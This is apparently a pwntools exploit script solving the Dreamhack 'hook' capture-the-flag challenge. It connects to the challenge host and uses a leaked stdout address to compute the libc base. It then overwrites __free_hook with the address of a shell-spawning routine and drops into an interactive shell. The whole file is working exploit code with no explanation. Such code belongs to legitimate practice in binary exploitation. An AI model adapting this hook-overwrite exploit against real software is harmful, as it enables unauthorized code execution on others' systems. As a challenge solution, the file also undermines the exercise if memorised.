from pwn import *

port = 17664
rem = remote("host1.dreamhack.games", port)
lib = ELF("./Pwnable/hook/problem/libc-2.23.so")

def slog(name, addr): return success(': '.join([name, hex(addr)]))

rem.recvuntil(b'stdout: 0x')
stdout_addr = int(rem.recvn(12).decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
hook_addr = lib_base + lib.symbols['__free_hook']
shell_addr = 0x400a11

slog('lib', lib_base)
slog('hook', hook_addr)

payload = p64(hook_addr) + p64(shell_addr)

rem.sendlineafter(b'Size: ', b'20')
rem.sendlineafter(b'Data: ', payload)

rem.interactive()